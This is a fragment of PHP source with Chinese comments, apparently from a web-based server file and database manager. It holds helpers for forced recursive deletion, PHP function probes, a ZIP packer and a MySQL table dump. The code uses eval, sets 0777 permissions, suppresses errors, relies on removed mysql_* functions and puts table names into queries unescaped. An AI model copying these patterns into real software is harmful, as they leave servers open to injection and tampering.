			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// 删除目录
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		echo @rmdir($deldir) ? "目录删除成功!" : "<font color=\"#ff0000\">目录删除失败!</font>";	
	} 

	// 判断读写情况
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// 表格行间的背景色替换
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// 获取当前的文件系统路径
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// 检查PHP配置参数
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return No;
			break;
			case 1:
			return Yes;
			break;
			default:
			return $result;
			break;
		}
	}

	// 检查函数情况
	function getfun($funName) {
		return (false !== function_exists($funName)) ? Yes : No;
	}

	// 压缩打包类
	class PHPZip{
	var $out='';
		function PHPZip($dir, $zipfilename="")	{
    		if (@function_exists('gzcompress'))	{
				$curdir = getcwd();
				if (is_array($dir)) $filelist = $dir;
		        else{
			        $filelist=$this -> GetFileList($dir);//文件列表
				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
	            }
		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
				else chdir($curdir);
				if (count($filelist)>0){
					foreach($filelist as $filename){
						if (is_file($filename)){
							$fd = fopen ($filename, "r");
							$content = @fread ($fd, filesize ($filename));
							fclose ($fd);
						    if (is_array($dir)) $filename = basename($filename);
							$this -> addFile($content, $filename);
						}
					}
					$this->out = $this -> file();
					chdir($curdir);
					// 下面将生成的内容$out写入文件,如果需要在服务器生成压缩包，请去掉注释
					/*$fp = fopen($zipfilename, "w");
		            fwrite($fp, $this->out, strlen($this->out));
			        fclose($fp);
				    */
				}
				return 1;
			}
			else return 0;
		}

		// 获得指定目录文件列表
		function GetFileList($dir){
			static $a;
			if (is_dir($dir)) {
				if ($dh = opendir($dir)) {
			   		while (($file = readdir($dh)) !== false) {
						if($file!='.' && $file!='..'){
            				$f=$dir .'/'. $file;
            				if(is_dir($f)) $this->GetFileList($f);
							$a[]=$f;
	        			}
					}
     				closedir($dh);
    			}
			}
			return $a;
		}

		var $datasec      = array();
	    var $ctrl_dir     = array();
		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	    var $old_offset   = 0;

		function unix2DosTime($unixtime = 0) {
	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		    if ($timearray['year'] < 1980) {
				$timearray['year']    = 1980;
        		$timearray['mon']     = 1;
	        	$timearray['mday']    = 1;
		    	$timearray['hours']   = 0;
				$timearray['minutes'] = 0;
        		$timearray['seconds'] = 0;
	        } // end if
		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	    }

		function addFile($data, $name, $time = 0) {
	        $name     = str_replace('\\', '/', $name);

		    $dtime    = dechex($this->unix2DosTime($time));
	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
		              . '\x' . $dtime[4] . $dtime[5]
			          . '\x' . $dtime[2] . $dtime[3]
				      . '\x' . $dtime[0] . $dtime[1];
	        eval('$hexdtime = "' . $hexdtime . '";');
		    $fr   = "\x50\x4b\x03\x04";
			$fr   .= "\x14\x00";
	        $fr   .= "\x00\x00";
		    $fr   .= "\x08\x00";
			$fr   .= $hexdtime;

	        $unc_len = strlen($data);
		    $crc     = crc32($data);
			$zdata   = gzcompress($data);
	        $c_len   = strlen($zdata);
		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
			$fr      .= pack('V', $crc);
	        $fr      .= pack('V', $c_len);
		    $fr      .= pack('V', $unc_len);
			$fr      .= pack('v', strlen($name));
	        $fr      .= pack('v', 0);
		    $fr      .= $name;

			$fr .= $zdata;

	        $fr .= pack('V', $crc);
		    $fr .= pack('V', $c_len);
			$fr .= pack('V', $unc_len);

	        $this -> datasec[] = $fr;
		    $new_offset        = strlen(implode('', $this->datasec));

			$cdrec = "\x50\x4b\x01\x02";
	        $cdrec .= "\x00\x00";
		    $cdrec .= "\x14\x00";
			$cdrec .= "\x00\x00";
	        $cdrec .= "\x08\x00";
		    $cdrec .= $hexdtime;
			$cdrec .= pack('V', $crc);
	        $cdrec .= pack('V', $c_len);
		    $cdrec .= pack('V', $unc_len);
			$cdrec .= pack('v', strlen($name) );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('v', 0 );
			$cdrec .= pack('v', 0 );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('V', 32 );
			$cdrec .= pack('V', $this -> old_offset );
	        $this -> old_offset = $new_offset;
		    $cdrec .= $name;

			$this -> ctrl_dir[] = $cdrec;
	    }

		function file() {
			$data    = implode('', $this -> datasec);
	        $ctrldir = implode('', $this -> ctrl_dir);
		    return
			    $data .
				$ctrldir .
	            $this -> eof_ctrl_dir .
		        pack('v', sizeof($this -> ctrl_dir)) .
			    pack('v', sizeof($this -> ctrl_dir)) .
				pack('V', strlen($ctrldir)) .
	            pack('V', strlen($data)) .
		        "\x00\x00";
	    }
	}

	// 备份数据库
	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);
	
		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}
?>